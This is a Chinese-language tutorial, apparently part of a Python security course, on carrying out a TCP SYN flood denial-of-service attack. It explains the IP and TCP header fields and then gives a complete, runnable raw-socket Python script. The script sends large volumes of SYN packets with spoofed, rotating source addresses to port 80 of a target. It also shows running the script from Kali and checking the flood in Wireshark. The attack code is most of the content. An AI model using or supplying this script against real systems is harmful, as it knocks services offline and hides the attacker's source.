## DOS：TCP SYN洪水攻击

套接字通信中，IP与TCP头通常由内核自动设置。但若想使用原始套接字仅传送SYN包，则需要程序员亲自创建。要想在Python内部使用C语言功能，需要将其创建为C语言中使用的头文件形式。首先了解IP头文件，其结构如下。

  从Version 到Destination Address总共有20字节。Version填入4代表IPv4，IHL表示整个IP头长度，以32位为单位，表示包含多少个32位。此处填入5表示20字节。Identification填入任意值，Flags与Fragment Offset的值同时设置为0。Time to Live填入255，它是网络支持的最大值。

  Protocol 设置为socket.IPPROTO_TCP，Total Length与Header Checksum在发送包时由内核设置。

![img](img/e9f00474-43f7-11eb-8f8d-8cc6814bc10b.png)

下面设置TCP头。IP指定地址，TCP指定通信中要使用的端口。TCP包的类型通过Flags值进行设置。SYN洪水攻击中，由于只传送大量SYN包，所以只需将SYN值设置为1，其他全部设置为0。

向Source Port输入任意值，向Destination Port输入80，它是要攻击的目标端口。将Sequence Number与Acknowledgment Number也设为任意值。DataOffset表示TCP头结束位置，以32位为单位，设置为5表示头长度为20字节。由于只发送SYN包，所以要将Flags设置为1。Window设置为5840，它是协议允许的最大窗口。Checksum在发送包时由内核自动设置。

![img](img/ffd7d2c6-43f7-11eb-9e9a-8cc6814bc10b.png)

若想设置IP头与TCP头，需要将Python中使用的字符变换为C语言的结构体。struct模块提供了pack（)函数，在Python中使用该函数即可轻松完成转换。

### 代码实现

 

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/25 14:49 
# @Author   : ordar
# @File     : dos_syn_attack.py  
# @Project  : pythonCourse
# @Python   : 3.7.5
import socket
from struct import *


# 1. 声明TCP校验和计算函数：TCP校验和用于保证传送数据的完整性，
# 该函数用于计算TCP校验和。计算TCP校验和时，先将头与数据以16位为单位进行分割，
# 再求校验位和，然后按位取反得到校验和。
def makeChecksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
        s = s + w
    s = (s>>16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


# 2. 声明创建IP头函数：如前所述，该函数用于创建IP头。
def makeIPHeader(sourceIP, destIP):
    version = 4
    ihl = 5
    typeOfService = 0
    totalLength = 20 + 20
    id = 999
    flagsOffSet = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    headerChecksum = 0
    sourceAddress = socket.inet_aton(sourceIP)
    destinationAddress = socket.inet_aton(destIP)
    ihlVersion = (version << 4) + ihl
    # 3. 创建IP头结构体：使用pack()函数转换为C语言中使用的结构体形式。
    return pack('!BBHHHBBH4s4s', ihlVersion, typeOfService, totalLength, id, flagsOffSet, ttl, protocol,
                headerChecksum, sourceAddress, destinationAddress)


# 4. 声明TCP 头创建函数：如前所述，该函数用于创建TCP头。
def makeTCPHeader(port, icheckSum='none'):
    sourcePort = port
    destinationAddressPort = 80
    SeqNumber = 0
    AckNumber = 0
    dataOffset = 5
    flagFin = 0
    flagSyn = 1
    flagRst = 0
    flagPsh = 0
    flagAck = 0
    flagUrg = 0

    window = socket.htons(5840)

    if icheckSum == 'none':
        checksum = 0
    else:
        checksum = icheckSum

    urgentPointer = 0
    dataOffsetTesv = (dataOffset << 4) + 0
    flags = (flagUrg << 5) + (flagAck << 4) + (flagPsh << 3) + (flagRst << 2) + (flagSyn << 1) + flagFin
    # 5. 创建TCP 头结构体：使用pack（）函数转换为C语言中使用的结构体形式。
    return pack("!HHLLBBHHH", sourcePort, destinationAddressPort, SeqNumber, AckNumber, dataOffsetTesv, flags, window,
                checksum, urgentPointer)


# 6. 创建原始套接字：创建原始套接字对象，使用它可以任意创建IP头与TCP头。使用原始套接字需要拥有管理员权限。
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
# 7. 设置套接字选项：设置套接字选项，以便开发人员创建IP头。
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# 8. 循环语句：使用该循环语句发送大量SYN包。
for j in range(1, 20):
    for k in range(1, 255):
        for l in range(1, 255):
            # 9. 设置IP：设置源IP与目的地IP。为了方便测试，将源IP设置为每次都变化
            sourceIP = "192.168.{}.{}".format(str(k), str(l))
            destIP = "192.168.181.137"
            # 10. 创建IP头：调用相应函数创建IP头，并转换为C语言结构体形式。
            ipHeader = makeIPHeader(sourceIP, destIP)
            # 11. 计算TCP校验和：调用相关函数，计算TCP校验和。
            tcpHeader = makeTCPHeader(10000+j+k+l)
            # 12. 转换IP结构体：使用inet_atonO函数将字符串数据转换为in_addr结构体。
            sourceAddr = socket.inet_aton(sourceIP)
            destAddr = socket.inet_aton(destIP)

            placeholder = 0
            protocol = socket.IPPROTO_TCP
            tcpLen = len(tcpHeader)
            psh = pack("!4s4sBBH", sourceAddr, destAddr, placeholder, protocol, tcpLen)
            psh = psh + tcpHeader
            # 13. 计算TCP校验和：调用相关函数，计算TCP校验和。
            tcpChecksum = makeChecksum(psh)
            # 14. 创建TCP头：设置TCP检验和，创建实际用于传送的TCP头。
            tcpHeader = makeTCPHeader(10000+j+k+l, tcpChecksum)

            packet = ipHeader + tcpHeader
            # 15. 传送包：将IP头与TCP头封装为TCPSYN包并传送。建立连接前，可以使用sendto)方法从发送方发送数据包。
            s.sendto(packet, (destIP, 0))


```



### 运行结果

运行环境：在linux系统中可以正常运行，在Windows系统中会有错误。

切换操作机到kali，然后在kali中运行我们编写的py

![img](img/8ef9c72e-509a-11eb-90b5-8cc6814bc10b.png)

我们编写代码是在win7中，运行却要在kali中，可以通过python开启一个简易的http服务将py文件传输到kali。

在win7的py文件目录开一个cmd窗口，然后运行

```python
python2命令
python2 -m SimpleHTTPServer 8080

python3命令
python3 -m http.server 8080
```

8080是端口，这个可以自己指定，选择一个未被占用的端口就好

然后在kali中用浏览器访问http://win7的ip:8080端口就可以

比如我用的是win7x64，所以访问http://192.168.1.2:8080

然后就可以复制粘贴和下载了

![img](img/09a3f4e6-509c-11eb-98db-8cc6814bc10b.png)

在攻击机上用wireshark抓包，可以看到大量源地址变化的发送给目标地址的SYN包。

![img](img/22f23524-43f8-11eb-b4ad-8cc6814bc10b.png)

